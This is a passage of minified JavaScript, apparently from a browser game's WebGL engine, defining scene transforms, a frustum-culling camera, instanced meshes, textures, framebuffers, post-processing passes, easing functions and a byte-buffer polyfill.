            e && this.parent && t !== this.parent && this.parent.removeChild(this, !1),
                this.parent = t,
                e && t && t.addChild(this, !1)
        }
        addChild(t, e = !0) {
            ~this.children.indexOf(t) || this.children.push(t),
                e && t.setParent(this, !1)
        }
        removeChild(t, e = !0) {
            ~this.children.indexOf(t) && this.children.splice(this.children.indexOf(t), 1),
                e && t.setParent(null, !1)
        }
        updateMatrixWorld(t = !1) {
            if (this.visible) {
                this.matrixAutoUpdate && this.updateMatrix(),
                    (this.worldMatrixNeedsUpdate || t) && (null === this.parent ? _n(this.KP, this.matrix) : Pn(this.KP, this.parent.KP, this.matrix),
                        this.worldMatrixNeedsUpdate = !1,
                        t = !0);
                for (let e = 0, s = this.children.length; e < s; e++)
                    this.children[e].updateMatrixWorld(t)
            }
        }
        updateMatrix() {
            this.updateRotation(!1),
                Rn(this.matrix, this.quaternion, this.position, this.scale),
                this.worldMatrixNeedsUpdate = !0
        }
        updateRotation(t = !1) {
            (t || this.rotationNeedsUpdate) && (this.rotationNeedsUpdate = !1,
                Yn(this.quaternion, this.rotation))
        }
        traverse(t) {
            if (!t(this))
                for (let e = 0, s = this.children.length; e < s; e++)
                    this.children[e].traverse(t)
        }
        decompose() {
            this.updateRotation(!1),
                In(this.position, this.matrix),
                Bn(this.quaternion, this.matrix),
                Dn(this.scale, this.matrix),
                this.rotFromQuaternion()
        }
        lookAt(t, e = !1, s) {
            e ? Un(this.matrix, this.position, t, s) : Un(this.matrix, t, this.position, s),
                Bn(this.quaternion, this.matrix),
                this.rotFromQuaternion()
        }
        rotFromQuaternion() {
            this.rotationNeedsUpdate = !1,
                zn(Qn, this.quaternion),
                jn(this.rotation, Qn)
        }
    }
    const ta = Mn()
        , ea = [0, 0, 0];
    class sa extends Jn {
        constructor(t, { near: e = .1, FS: s = 100, fov: i = 45, aspect: n = 1, left: a, right: r, bottom: o, top: l } = {}) {
            super(),
                this.type = "",
                this.near = e,
                this.FS = s,
                this.fov = i,
                this.aspect = n,
                this.zR = Mn(),
                this.jH = Mn(),
                this.kX = Mn(),
                this.worldPosition = [0, 0, 0],
                a || r ? this.orthographic({
                    left: a,
                    right: r,
                    bottom: o,
                    top: l
                }) : this.perspective(),
                this.frustum = [[0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0], [0, 0, 0]],
                this.frustumConstants = [0, 0, 0, 0, 0, 0]
        }
        perspective({ near: t = this.near, FS: e = this.FS, fov: s = this.fov, aspect: i = this.aspect } = {}) {
            return Fn(this.zR, s * (Math.PI / 180), i, t, e),
                this.type = "perspective",
                this
        }
        orthographic({ near: t = this.near, FS: e = this.FS, left: s = -1, right: i = 1, bottom: n = -1, top: a = 1 } = {}) {
            return Zn(this.zR, s, i, n, a, t, e),
                this.type = "orthographic",
                this
        }
        updateMatrixWorld(t) {
            return super.updateMatrixWorld(t),
                Cn(this.jH, this.KP),
                Pn(this.kX, this.zR, this.jH),
                In(this.worldPosition, this.KP),
                this
        }
        lookAt(t, e) {
            return super.lookAt(t, !0, e),
                this
        }
        project(t) {
            return hn(t, t, this.jH),
                hn(t, t, this.zR),
                t
        }
        unproject(t) {
            return hn(t, t, Cn(ta, this.zR)),
                hn(t, t, this.KP),
                t
        }
        updateFrustum() {
            const t = this.kX;
            Vi(this.frustum[0], t[3] - t[0], t[7] - t[4], t[11] - t[8]),
                Vi(this.frustum[1], t[3] + t[0], t[7] + t[4], t[11] + t[8]),
                Vi(this.frustum[2], t[3] + t[1], t[7] + t[5], t[11] + t[9]),
                Vi(this.frustum[3], t[3] - t[1], t[7] - t[5], t[11] - t[9]),
                Vi(this.frustum[4], t[3] - t[2], t[7] - t[6], t[11] - t[10]),
                Vi(this.frustum[5], t[3] + t[2], t[7] + t[6], t[11] + t[10]),
                this.frustumConstants[0] = t[15] - t[12],
                this.frustumConstants[1] = t[15] + t[12],
                this.frustumConstants[2] = t[15] + t[13],
                this.frustumConstants[3] = t[15] - t[13],
                this.frustumConstants[4] = t[15] - t[14],
                this.frustumConstants[5] = t[15] + t[14];
            for (let t = 0; t < 6; t++) {
                const e = this.frustum[t]
                    , s = 1 / Wi(e);
                en(e, e, s),
                    this.frustumConstants[t] *= s
            }
        }
        frustumIntersectsMesh(t) {
            t.geometry.bounds.radius === 1 / 0 && t.geometry.computeBoundingSphere(),
                Yi(ea, t.geometry.bounds.center),
                hn(ea, ea, t.KP);
            const e = t.geometry.bounds.radius * An(t.KP);
            return this.frustumIntersectsSphere(ea, e)
        }
        frustumIntersectsSphere(t, e) {
            for (let s = 0; s < 6; s++) {
                if (ln(this.frustum[s], t) + this.frustumConstants[s] < -e)
                    return !1
            }
            return !0
        }
    }
    let ia = 0;
    class na extends Jn {
        constructor(t, { geometry: e, program: s, mode: i = t.TRIANGLES, frustumCulled: n = !0, renderOrder: a = 0, shadowProgram: r = null, throwShadow: o = new Set, receiveShadow: l = new Set, matrixAutoUpdate: c = !0 } = {}) {
            super(),
                this.gl = t,
                this.id = ia++,
                this.geometry = e,
                this.program = s,
                this.shadowProgram = r,
                this.throwShadow = o,
                this.receiveShadow = l,
                this.mode = i,
                this.matrixAutoUpdate = c,
                this.frustumCulled = n,
                this.renderOrder = a,
                this.Rg = Mn()
        }
        draw({ camera: t, shadowTarget: e = null } = {}) {
            if (!this.program.active)
                return;
            this.onBeforeRender && this.onBeforeRender({
                mesh: this,
                camera: t,
                shadowTarget: e
            });
            const s = e ? this.shadowProgram : this.program;
            if (e && !this.throwShadow.has(e))
                return;
            t && s && (s.uniforms.zR && (s.uniforms.zR.value = t.zR),
                s.uniforms.KD && (s.uniforms.KD.value = t.worldPosition),
                s.uniforms.jH && (s.uniforms.jH.value = t.jH),
                s.uniforms.kX && (s.uniforms.kX.value = t.kX),
                s.uniforms.Rg && (Pn(this.Rg, t.jH, this.KP),
                    s.uniforms.Rg.value = this.Rg),
                s.uniforms.Td && (s.uniforms.Td.value = this.matrix)),
                s.autoUniforms.forEach(t => {
                    s.uniforms[t].value = this[t]
                }
                );
            const i = s.cullFace && Tn(this.KP) < 0
                , n = this.gl.renderer.currentProgram === s.id
                , a = this.gl.renderer.currentGeometry === this.geometry.id;
            s.use({
                programActive: n,
                flipFaces: i,
                shadowTarget: e
            }),
                this.geometry.draw({
                    mode: this.mode,
                    program: s,
                    geometryBound: a
                }),
                this.onAfterRender && this.onAfterRender({
                    mesh: this,
                    camera: t
                })
        }
    }
    const aa = []
        , ra = () => {
            if (aa.length > 0) {
                return aa.pop()
            }
            return new Jn
        }
        , oa = t => {
            t.reset(),
                aa.indexOf(t) < 0 ? aa.push(t) : console.error("tried returning transform that is already known")
        }
        , la = [0, 0, 0];
    class ca extends na {
        constructor(t, { geometryAttributes: e, program: s, mode: i = t.TRIANGLES, renderOrder: n = 0, shadowProgram: a = null, throwShadow: r = new Set, receiveShadow: o = new Set, dynamic: l = !1, frustum: c } = {}) {
            super(t, {
                program: s,
                mode: i,
                renderOrder: n,
                shadowProgram: a,
                throwShadow: r,
                receiveShadow: o,
                geometry: new bn(t),
                frustumCulled: !1,
                matrixAutoUpdate: !1
            }),
                this.visible = !1,
                this.individualFrustums = c,
                this.Ud = !1,
                this.dynamicThrowShadwos = !1,
                this.dynamic = l,
                this.needsUpdate = !1,
                this.lastUpdateCamPos = [0, 0, 0],
                this.instances = []
        }
        create() {
            const t = ra();
            return t.matrixAutoUpdate = this.dynamic,
                t.geometry = this.geometry,
                t.data.KP = t.KP,
                t.data.multi = this,
                this.instances.indexOf(t) < 0 ? this.instances.push(t) : console.log("error, instance already present"),
                this.needsUpdate = !0,
                t
        }
        remove(t) {
            this.instances.splice(this.instances.indexOf(t), 1),
                this.needsUpdate = !0,
                oa(t)
        }
        rebuild(t) {
            if (!this.needsUpdate && an(this.lastUpdateCamPos, t.worldPosition) < 100)
                return;
            Yi(this.lastUpdateCamPos, t.worldPosition),
                this.needsUpdate = this.dynamic;
            const e = this.instances.filter(e => !!e.visible && (In(la, e.KP),
                e.data.distToCam = an(la, t.worldPosition),
                e.data.distToCam < (t.FS + 10) ** 2 && (!this.dynamic || !this.individualFrustums || t.frustumIntersectsMesh(e))));
            if (this.drawCount = e.length,
                this.geometry.setInstancedCount(this.drawCount),
                0 != this.drawCount)
                for (let t = 0; t < this.instanced.length; ++t) {
                    const s = this.instanced[t];
                    ha(s, s.size, this.drawCount),
                        s.size > 1 ? da(s, s.size, this.drawCount, s.name, e) : ua(s, s.size, this.drawCount, s.name, e),
                        this.geometry.updateAttribute(s)
                }
        }
        draw({ camera: t, shadowTarget: e = null, sceneCamera: s, update: i } = {}) {
            this.visible && ((i && this.dynamicThrowShadwos || !this.dynamicThrowShadwos && !e) && this.rebuild(s || t),
                this.drawCount > 0 && super.draw({
                    camera: t,
                    shadowTarget: e
                }))
        }
        setAttributes(t) {
            const e = []
                , s = {
                    ...t
                }
                , i = {
                    ...this.program.instanced,
                    KP: {
                        size: 16
                    }
                };
            for (const t in i)
                s[t] = {
                    name: t,
                    instanced: !0,
                    bufferMode: this.dynamic ? 35048 : 35044,
                    size: i[t].size,
                    data: new Float32Array(i[t].size)
                },
                    e.push(s[t]);
            this.geometry.addAttributes(s),
                this.instanced = e
        }
    }
    const ha = (t, e, s) => {
        t.data = t.data.byteLength >= e * s * 4 ? t.data : new Float32Array(e * (s + 5))
    }
        , da = (t, e, s, i, n) => {
            for (let a = 0; a < s; ++a)
                t.data.set(n[a].data[i], a * e)
        }
        , ua = (t, e, s, i, n) => {
            for (let e = 0; e < s; ++e)
                t.data[e] = n[e].data[i]
        }
        , ma = new Uint8Array(4);
    function pa(t) {
        return 0 == (t & t - 1)
    }
    let fa = 1;
    class ga {
        constructor(t, { image: e, target: s = t.TEXTURE_2D, type: i = t.UNSIGNED_BYTE, format: n = t.RGBA, internalFormat: a = n, wrapS: r = t.CLAMP_TO_EDGE, wrapT: o = t.CLAMP_TO_EDGE, generateMipmaps: l = !0, minFilter: c = (l ? t.NEAREST_MIPMAP_LINEAR : t.LINEAR), magFilter: h = t.LINEAR, premultiplyAlpha: d = !1, flipY: u = !0, level: m = 0, width: p, height: f = p, compareMode: g = t.NONE, compareFunc: v = t.LEQUAL } = {}) {
            this.gl = t,
                this.id = fa++,
                this.image = e,
                this.target = s,
                this.type = i,
                this.format = n,
                this.internalFormat = a,
                this.minFilter = c,
                this.magFilter = h,
                this.wrapS = r,
                this.wrapT = o,
                this.generateMipmaps = l,
                this.premultiplyAlpha = d,
                this.flipY = u,
                this.level = m,
                this.width = p,
                this.height = f,
                this.compareMode = g,
                this.texture = this.gl.createTexture(),
                this.store = {
                    image: null
                },
                this.glState = this.gl.renderer.state,
                this.state = {},
                this.state.minFilter = this.gl.NEAREST_MIPMAP_LINEAR,
                this.state.magFilter = this.gl.LINEAR,
                this.state.wrapS = this.gl.REPEAT,
                this.state.wrapT = this.gl.REPEAT,
                this.state.premultiplyAlpha = !1
        }
        bind() {
            this.glState.textureUnits[this.glState.activeTextureUnit] !== this.id && (this.gl.bindTexture(this.target, this.texture),
                this.glState.textureUnits[this.glState.activeTextureUnit] = this.id)
        }
        update(t = 0) {
            const e = !(this.image === this.store.image && !this.needsUpdate);
            (e || this.glState.textureUnits[t] !== this.id) && (this.gl.renderer.activeTexture(t),
                this.bind()),
                e && (this.needsUpdate = !1,
                    this.flipY !== this.glState.flipY && (this.gl.pixelStorei(this.gl.UNPACK_FLIP_Y_WEBGL, this.flipY),
                        this.glState.flipY = this.flipY),
                    this.premultiplyAlpha !== this.state.premultiplyAlpha && (this.gl.pixelStorei(this.gl.UNPACK_PREMULTIPLY_ALPHA_WEBGL, this.premultiplyAlpha),
                        this.state.premultiplyAlpha = this.premultiplyAlpha),
                    this.minFilter !== this.state.minFilter && (this.gl.texParameteri(this.target, this.gl.TEXTURE_MIN_FILTER, this.minFilter),
                        this.state.minFilter = this.minFilter),
                    this.magFilter !== this.state.magFilter && (this.gl.texParameteri(this.target, this.gl.TEXTURE_MAG_FILTER, this.magFilter),
                        this.state.magFilter = this.magFilter),
                    this.wrapS !== this.state.wrapS && (this.gl.texParameteri(this.target, this.gl.TEXTURE_WRAP_S, this.wrapS),
                        this.state.wrapS = this.wrapS),
                    this.wrapT !== this.state.wrapT && (this.gl.texParameteri(this.target, this.gl.TEXTURE_WRAP_T, this.wrapT),
                        this.state.wrapT = this.wrapT),
                    this.compareMode !== this.state.compareMode && (this.gl.texParameteri(this.target, this.gl.TEXTURE_COMPARE_MODE, this.compareMode),
                        this.state.compareMode = this.compareMode),
                    this.compareFunc !== this.state.compareFunc && (this.gl.texParameteri(this.target, this.gl.TEXTURE_COMPARE_FUNC, this.compareFunc),
                        this.state.compareFunc = this.compareFunc),
                    this.image ? (this.image.width && (this.width = this.image.width,
                        this.height = this.image.height),
                        this.gl.renderer.isWebgl2 || ArrayBuffer.isView(this.image) ? this.gl.texImage2D(this.target, this.level, this.internalFormat, this.width, this.height, 0, this.format, this.type, this.image) : this.gl.texImage2D(this.target, this.level, this.internalFormat, this.format, this.type, this.image),
                        this.generateMipmaps && (this.gl.renderer.isWebgl2 || pa(this.image.width) && pa(this.image.height) ? this.gl.generateMipmap(this.target) : (this.generateMipmaps = !1,
                            this.wrapS = this.wrapT = this.gl.CLAMP_TO_EDGE,
                            this.minFilter = this.gl.LINEAR))) : this.width ? this.gl.texImage2D(this.target, this.level, this.internalFormat, this.width, this.height, 0, this.format, this.type, null) : this.gl.texImage2D(this.target, 0, this.gl.RGBA, 1, 1, 0, this.gl.RGBA, this.gl.UNSIGNED_BYTE, ma),
                    this.store.image = this.image,
                    this.onUpdate && this.onUpdate())
        }
    }
    class va {
        constructor(t, { width: e = t.canvas.width, height: s = t.canvas.height, target: i = t.FRAMEBUFFER, color: n = 1, LX: a = !0, stencil: r = !1, depthTexture: o = !1, depthCompareMode: l = t.NONE, wrapS: c = t.CLAMP_TO_EDGE, wrapT: h = t.CLAMP_TO_EDGE, minFilter: d = t.LINEAR, magFilter: u = t.LINEAR } = {}) {
            this.gl = t,
                this.width = e,
                this.height = s,
                this.buffer = this.gl.createFramebuffer(),
                this.target = i,
                this.gl.bindFramebuffer(this.target, this.buffer),
                this.textures = [];
            for (let i = 0; i < n; i++)
                this.textures.push(new ga(t, {
                    width: e,
                    height: s,
                    wrapS: c,
                    wrapT: h,
                    minFilter: d,
                    magFilter: u,
                    flipY: !1,
                    generateMipmaps: !1
                })),
                    this.textures[i].update(),
                    this.gl.framebufferTexture2D(this.target, this.gl.COLOR_ATTACHMENT0 + i, this.gl.TEXTURE_2D, this.textures[i].texture, 0);
            if (this.texture = this.textures[0],
                o && (this.gl.renderer.isWebgl2 || this.gl.renderer.getExtension("WEBGL_depth_texture"))) {
                const i = l == this.gl.COMPARE_REF_TO_TEXTURE ? this.gl.LINEAR : this.gl.NEAREST;
                this.depthTexture = new ga(t, {
                    width: e,
                    height: s,
                    wrapS: c,
                    wrapT: h,
                    minFilter: i,
                    magFilter: i,
                    flipY: !1,
                    format: this.gl.DEPTH_COMPONENT,
                    internalFormat: t.renderer.isWebgl2 ? this.gl.DEPTH_COMPONENT24 : this.gl.DEPTH_COMPONENT,
                    type: this.gl.UNSIGNED_INT,
                    generateMipmaps: !1,
                    compareMode: l
                }),
                    this.depthTexture.update(),
                    this.gl.framebufferTexture2D(this.target, this.gl.DEPTH_ATTACHMENT, this.gl.TEXTURE_2D, this.depthTexture.texture, 0)
            } else
                a && !r && (this.depthBuffer = this.gl.createRenderbuffer(),
                    this.gl.bindRenderbuffer(this.gl.RENDERBUFFER, this.depthBuffer),
                    this.gl.renderbufferStorage(this.gl.RENDERBUFFER, this.gl.DEPTH_COMPONENT16, e, s),
                    this.gl.framebufferRenderbuffer(this.target, this.gl.DEPTH_ATTACHMENT, this.gl.RENDERBUFFER, this.depthBuffer)),
                    r && !a && (this.stencilBuffer = this.gl.createRenderbuffer(),
                        this.gl.bindRenderbuffer(this.gl.RENDERBUFFER, this.stencilBuffer),
                        this.gl.renderbufferStorage(this.gl.RENDERBUFFER, this.gl.STENCIL_INDEX8, e, s),
                        this.gl.framebufferRenderbuffer(this.target, this.gl.STENCIL_ATTACHMENT, this.gl.RENDERBUFFER, this.stencilBuffer)),
                    a && r && (this.depthStencilBuffer = this.gl.createRenderbuffer(),
                        this.gl.bindRenderbuffer(this.gl.RENDERBUFFER, this.depthStencilBuffer),
                        this.gl.renderbufferStorage(this.gl.RENDERBUFFER, this.gl.DEPTH_STENCIL, e, s),
                        this.gl.framebufferRenderbuffer(this.target, this.gl.DEPTH_STENCIL_ATTACHMENT, this.gl.RENDERBUFFER, this.depthStencilBuffer));
            this.gl.bindFramebuffer(this.target, null)
        }
    }
    function ya(t, e) {
        return t[0] = e[0],
            t[1] = e[1],
            t
    }
    function ba(t, e, s) {
        return t[0] = e,
            t[1] = s,
            t
    }
    function wa(t, e, s) {
        return t[0] = e[0] + s[0],
            t[1] = e[1] + s[1],
            t
    }
    function xa(t, e, s) {
        return t[0] = e[0] - s[0],
            t[1] = e[1] - s[1],
            t
    }
    function ka(t, e, s) {
        return t[0] = e[0] * s,
            t[1] = e[1] * s,
            t
    }
    function $a(t, e, s, i) {
        return t[0] = e[0] + s[0] * i,
            t[1] = e[1] + s[1] * i,
            t
    }
    function Sa(t, e) {
        const s = e[0] - t[0]
            , i = e[1] - t[1];
        return s * s + i * i
    }
    function Ea(t) {
        const e = t[0]
            , s = t[1];
        return Math.sqrt(e * e + s * s)
    }
    function Ma(t) {
        const e = t[0]
            , s = t[1];
        return e * e + s * s
    }
    function _a(t, e) {
        const s = e[0]
            , i = e[1];
        let n = s * s + i * i;
        return n > 0 && (n = 1 / Math.sqrt(n)),
            t[0] = e[0] * n,
            t[1] = e[1] * n,
            t
    }
    function Ca(t, e) {
        return t[0] === e[0] && t[1] === e[1]
    }
    function Ta(t, e, s) {
        const i = Math.sin(s)
            , n = Math.cos(s);
        return t[0] = e[1] * i + e[0] * n,
            t[1] = e[1] * n - e[0] * i,
            t
    }
    class Pa {
        constructor(t, { width: e, height: s, dpr: i, wrapS: n = t.CLAMP_TO_EDGE, wrapT: a = t.CLAMP_TO_EDGE, minFilter: r = t.LINEAR, magFilter: o = t.LINEAR, resolution: l = 1 } = {}) {
            this.gl = t,
                this.options = {
                    wrapS: n,
                    wrapT: a,
                    minFilter: r,
                    magFilter: o
                },
                this.passes = [],
                this.geometry = new bn(t, {
                    position: {
                        size: 2,
                        data: new Float32Array([-1, -1, 3, -1, -1, 3])
                    },
                    Ek: {
                        size: 2,
                        data: new Float32Array([0, 0, 2, 0, 0, 2])
                    }
                }),
                this.resize({
                    width: e,
                    height: s,
                    dpr: i,
                    resolution: l
                })
        }
        addPass({ vertex: t = Ia, fragment: e = Da, uniforms: s = {}, textureUniform: i = "Pm", enabled: n = !0, globalUniforms: a, postDraw: r } = {}) {
            s[i] = {
                value: this.target.texture
            },
                s.vn = {
                    value: this.original.texture
                },
                s.Nh = {
                    value: this.original.depthTexture
                };
            const o = new xn(this.gl, {
                vertex: t,
                fragment: e,
                uniforms: s,
                globalUniforms: a
            })
                , l = {
                    mesh: new na(this.gl, {
                        geometry: this.geometry,
                        program: o
                    }),
                    program: o,
                    uniforms: s,
                    enabled: n,
                    textureUniform: i,
                    postDraw: r
                };
            return this.passes.push(l),
                l
        }
        resize({ width: t, height: e, dpr: s, resolution: i = 1 } = {}) {
            s && (this.dpr = s),
                t && (this.width = t * i,
                    this.height = e * i),
                s = this.dpr || this.gl.renderer.dpr,
                t = (this.width || this.gl.renderer.width) * s,
                e = (this.height || this.gl.renderer.height) * s,
                this.options.width = t,
                this.options.height = e,
                this.target = new va(this.gl, {
                    depthTexture: !0,
                    ...this.options
                }),
                this.original = new va(this.gl, {
                    depthTexture: !0,
                    ...this.options
                }),
                this.ping = new va(this.gl, this.options),
                this.pong = new va(this.gl, this.options),
                this.passes.forEach(t => {
                    t.uniforms.vn = {
                        value: this.original.texture
                    },
                        t.uniforms.Nh = {
                            value: this.original.depthTexture
                        }
                }
                )
        }
        render({ scene: t, camera: e, target: s = null, update: i = !0, sort: n = !0, frustumCull: a = !0 }) {
            const r = this.passes.filter(t => t.enabled);
            this.gl.renderer.render({
                scene: t,
                camera: e,
                target: r.length ? this.original : s,
                update: i,
                sort: n,
                frustumCull: a
            }),
                r.forEach((t, e) => {
                    t.mesh.program.uniforms[t.textureUniform].value = e ? e % 2 ? this.ping.texture : this.pong.texture : this.target.texture,
                        this.gl.renderer.render({
                            scene: t.mesh,
                            target: e == r.length - 1 ? s : e % 2 ? this.pong : this.ping,
                            clear: !0
                        }),
                        t.postDraw && t.postDraw()
                }
                )
        }
    }
    const Ia = "#version 300 es\nin vec2 Ek;\nin vec2 position;\nout vec2 Zj;\nvoid main() {\n    Zj = Ek;\n    gl_Position = vec4(position, 0.0, 1.0);\n}"
        , Da = "#version 300 es\nprecision highp float;\nuniform sampler2D Pm;\nin vec2 Zj;\nout vec4 Tf;\nvoid main() {\n    Tf = texture2D(Pm, Zj);\n}";
    let Aa, Ba, Ra, za, Fa, Za, Ua;
    const La = [0, 1, 0]
        , Na = [0, 0, 0]
        , Oa = [0, 0, 0]
        , ja = [0, 0, 0]
        , qa = [0, 0, 0]
        , Xa = [0, 0, 0]
        , Ha = [0, 0, 0]
        , Ka = [0, 0, 0]
        , Wa = [0, 0, 0, 0]
        , Ya = [0, 0]
        , Va = [0, 0]
        , Ga = 256 / (2 * Math.PI)
        , Qa = t => {
            Ua = t
        }
        , Ja = (t, e, s, i, n, a, r) => {
            Aa = t,
                Ba = e,
                Ra = s,
                za = i,
                Fa = n,
                Za = a
        }
        , tr = new Map
        , er = () => {
            window.hordes = {
                events: {
                    on: sr,
                    remove: ir
                },
                get loc() {
                    return Xi
                },
                getCreatureName: t => Ua.entities.map.has(t) && Ua.entity(t).name
            },
                window.hordes.events.on("creatureTakeDamage", (t, e, s, i) => {
                    console.log(t, e, s, i)
                }
                )
        }
        , sr = (t, e) => (tr.has(t) ? tr.get(t).push(e) : tr.set(t, [e]),
            e)
        , ir = (t, e) => {
            if (!tr.has(t))
                return !1;
            tr.get(t).splice(tr.get(t).indexOf(e), 1)
        }
        , nr = (t, e, s) => Math.min(Math.max(t, e), s)
        , ar = (t, e) => (t % e + e) % e
        , rr = (t, e, s) => {
            const i = nr((s - t) / (e - t), 0, 1);
            return i * i * (3 - 2 * i)
        }
        , or = (t, e) => {
            const s = [(t >> 16 & 255) / 255, (t >> 8 & 255) / 255, (255 & t) / 255];
            return void 0 !== e && s.push(e),
                s
        }
        , lr = {
            linear: t => t,
            easeInQuad: t => t * t,
            easeInQuart: t => t ** 4,
            easeOutQuad: t => t * (2 - t),
            easeOutExpo: t => 1 - Math.pow(2, -10 * t),
            easeOutFlick: t => 1 - Math.pow(1 - t, 10),
            sin: t => Math.sin(3.14 * t),
            sinReverse: t => 1 - Math.sin(3.14 * t),
            easeInOutCubic: t => t < .5 ? 4 * t * t * t : (t - 1) * (2 * t - 2) * (2 * t - 2) + 1,
            easeInOutQuint: t => t < .5 ? 16 * t * t * t * t * t : 1 + 16 * --t * t * t * t * t,
            easeBounce: t => t < 1 / 2.75 ? 7.5625 * t * t : t < 2 / 2.75 ? 7.5625 * (t -= 1.5 / 2.75) * t + .75 : t < 2.5 / 2.75 ? 7.5625 * (t -= 2.25 / 2.75) * t + .9375 : 7.5625 * (t -= 2.625 / 2.75) * t + .984375,
            anticipate: t => -1 / (1 + Math.exp(50 * (t - .5))) + 1.4 * Math.sin(6.2 * (t - .5)) * (1 - .5 * t) + 1
        }
        , cr = (t, e, s, i) => (tn(ja, i, s),
            tn(Oa, e, s),
            cn(ja, ja, Oa),
            on(t, ja))
        , hr = 2 * Math.PI
        , dr = 3 * Math.PI
        , ur = t => (t % hr + hr) % hr
        , mr = t => {
            let e = Math.atan2(t[0], t[1]);
            return e < 0 && (e += 2 * Math.PI),
                e
        }
        , pr = t => {
            let e = Math.atan2(t[0], t[2]);
            return e < 0 && (e += 2 * Math.PI),
                e
        }
        , fr = (t, e) => (e - t + dr) % hr - Math.PI
        , gr = (t, e, s, i) => {
            en(Oa, e, 1 - i),
                en(ja, s, i),
                Qi(t, Oa, ja)
        }
        , vr = (t, e, s) => {
            tn(Oa, s, t);
            const i = ln(Oa, e);
            return sn(Oa, t, e, i)
        }
        , yr = (t, e) => (t[0] = e[0],
            t[1] = e[2],
            t)
        , br = (t, e, s) => (t[0] = e[0] + s[0],
            t[2] = e[2] + s[1],
            t);
    function wr(t) {
        if (t > Kr)
            throw new RangeError('The value "' + t + '" is invalid for option "size"');
        const e = new Uint8Array(t);
        return e.__proto__ = xr.prototype,
            e
    }
    function xr(t, e, s) {
        if ("number" == typeof t) {
            if ("string" == typeof e)
                throw new TypeError('The "string" argument must be of type string. Received type number');
            return $r(t)
        }
        return kr(t, e, s)
    }
    function kr(t, e, s) {
        if ("string" == typeof t)
            return Sr(t, e);
        if (ArrayBuffer.isView(t))
            return Er(t);
        if (null == t)
            throw TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof t);
        if (qr(t, ArrayBuffer) || t && qr(t.buffer, ArrayBuffer))
            return Mr(t, e, s);
        if ("number" == typeof t)
            throw new TypeError('The "value" argument must not be of type number. Received type number');
        const i = t.valueOf && t.valueOf();
        if (null != i && i !== t)
            return xr.from(i, e, s);
        const n = _r(t);
        if (n)
            return n;
        if ("undefined" != typeof Symbol && null != Symbol.toPrimitive && "function" == typeof t[Symbol.toPrimitive])
            return xr.from(t[Symbol.toPrimitive]("string"), e, s);
        throw new TypeError("The first argument must be one of type string, Buffer, ArrayBuffer, Array, or Array-like Object. Received type " + typeof t)
    }
    function $r(t) {
        return wr(t < 0 ? 0 : 0 | Cr(t))
    }
    function Sr(t, e) {
        if ("string" == typeof e && "" !== e || (e = "utf8"),
            !xr.isEncoding(e))
            throw new TypeError("Unknown encoding: " + e);
        const s = 0 | Tr(t, e);
        let i = wr(s);
        const n = i.write(t, e);
        return n !== s && (i = i.slice(0, n)),
            i
    }
    function Er(t) {
        const e = t.length < 0 ? 0 : 0 | Cr(t.length)
            , s = wr(e);
        for (let i = 0; i < e; i += 1)
            s[i] = 255 & t[i];
        return s
    }
    function Mr(t, e, s) {
        if (e < 0 || t.byteLength < e)
            throw new RangeError('"offset" is outside of buffer bounds');
        if (t.byteLength < e + (s || 0))
            throw new RangeError('"length" is outside of buffer bounds');
        let i;
        return i = void 0 === e && void 0 === s ? new Uint8Array(t) : void 0 === s ? new Uint8Array(t, e) : new Uint8Array(t, e, s),
            i.__proto__ = xr.prototype,
            i
    }
    function _r(t) {
        if (xr.isBuffer(t)) {
            const e = 0 | Cr(t.length)
                , s = wr(e);
            return 0 === s.length || t.copy(s, 0, 0, e),
                s
        }
        return void 0 !== t.length ? "number" != typeof t.length || Xr(t.length) ? wr(0) : Er(t) : "Buffer" === t.type && Array.isArray(t.data) ? Er(t.data) : void 0
    }
    function Cr(t) {
        return 0 | t
    }
    function Tr(t, e) {
        if (xr.isBuffer(t))
            return t.length;
        if (ArrayBuffer.isView(t) || qr(t, ArrayBuffer))
            return t.byteLength;
        if ("string" != typeof t)
            throw new TypeError('The "string" argument must be one of type string, Buffer, or ArrayBuffer. Received type ' + typeof t);
        const s = t.length
            , i = arguments.length > 2 && !0 === arguments[2];
        if (!i && 0 === s)
            return 0;
        let n = !1;
        for (; ;)
            switch (e) {
                case "ascii":
                    return s;
                case "utf8":
                case "utf-8":
                    return Nr(t).length;
                case "hex":
                    return s >>> 1;
                default:
                    if (n)
                        return i ? -1 : Nr(t).length;
                    e = ("" + e).toLowerCase(),
                        n = !0
            }
    }
    function Pr(t, e, s) {
        let i = !1;
        if ((void 0 === e || e < 0) && (e = 0),
            e > this.length)
            return "";
        if ((void 0 === s || s > this.length) && (s = this.length),
            s <= 0)
            return "";
        if ((s >>>= 0) <= (e >>>= 0))
            return "";
        for (t || (t = "utf8"); ;)
            switch (t) {
                case "hex":
                    return Fr(this, e, s);
                case "utf8":
                case "utf-8":
                    return Ar(this, e, s);
                case "ascii":
                    return zr(this, e, s);
                default:
                    if (i)
                        throw new TypeError("Unknown encoding: " + t);
                    t = (t + "").toLowerCase(),
                        i = !0
            }
    }
    function Ir(t, e, s, i) {
        return jr(Nr(e, t.length - s), t, s, i)
    }
    function Dr(t, e, s, i) {
        return jr(Or(e), t, s, i)
    }
    function Ar(t, e, s) {
        s = Math.min(t.length, s);
        const i = [];
        let n = e;
        for (; n < s;) {
            const e = t[n];
            let a = null
                , r = e > 239 ? 4 : e > 223 ? 3 : e > 191 ? 2 : 1;
            if (n + r <= s) {
                let s, i, o, l;
                switch (r) {
                    case 1:
                        e < 128 && (a = e);
                        break;
                    case 2:
                        s = t[n + 1],
                            128 == (192 & s) && (l = (31 & e) << 6 | 63 & s,
                                l > 127 && (a = l));
                        break;
                    case 3:
                        s = t[n + 1],
                            i = t[n + 2],
                            128 == (192 & s) && 128 == (192 & i) && (l = (15 & e) << 12 | (63 & s) << 6 | 63 & i,
                                l > 2047 && (l < 55296 || l > 57343) && (a = l));
                        break;
                    case 4:
                        s = t[n + 1],
                            i = t[n + 2],
                            o = t[n + 3],
                            128 == (192 & s) && 128 == (192 & i) && 128 == (192 & o) && (l = (15 & e) << 18 | (63 & s) << 12 | (63 & i) << 6 | 63 & o,
                                l > 65535 && l < 1114112 && (a = l))
                }
            }
            null === a ? (a = 65533,
                r = 1) : a > 65535 && (a -= 65536,
                    i.push(a >>> 10 & 1023 | 55296),
                    a = 56320 | 1023 & a),
                i.push(a),
                n += r
        }
        return Rr(i)
    }
    "undefined" != typeof Symbol && null != Symbol.species && xr[Symbol.species] === xr && Object.defineProperty(xr, Symbol.species, {
        value: null,
